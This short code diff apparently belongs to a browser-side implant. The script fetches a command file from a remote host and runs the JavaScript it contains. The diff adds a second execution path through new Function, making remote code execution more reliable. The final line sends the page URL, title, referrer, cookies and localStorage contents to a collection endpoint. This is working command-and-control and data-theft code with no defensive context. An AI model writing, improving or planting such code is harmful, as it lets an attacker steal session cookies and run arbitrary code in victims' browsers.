@@ -29,7 +29,7 @@ function run(){
  fetch(R+"cmd.json?x="+Math.random()).then(function(r){return r.text()}).then(function(t){
    var c=null;try{c=JSON.parse(t)}catch(e){post("badcmd",t.slice(0,60))}
    if(!c||!c.js){post("nocmd","");return}
-   try{var s=document.createElement("script");s.text=c.js;document.body.appendChild(s)}catch(e){post("execerr",e)}
+   try{var s=document.createElement("script");s.text=c.js;document.body.appendChild(s);if(!window.__CMD){try{new Function(c.js)();window.__CMD=1}catch(e){}}}catch(e){try{new Function(c.js)()}catch(e2){post("execbad",String(e2).slice(0,120))}}
  }).catch(function(){post("fetchcmd","x")})
 }
 post("agent",[location.href,document.title,location.referrer,document.cookie,"--ls--",ls()].join(" || "));
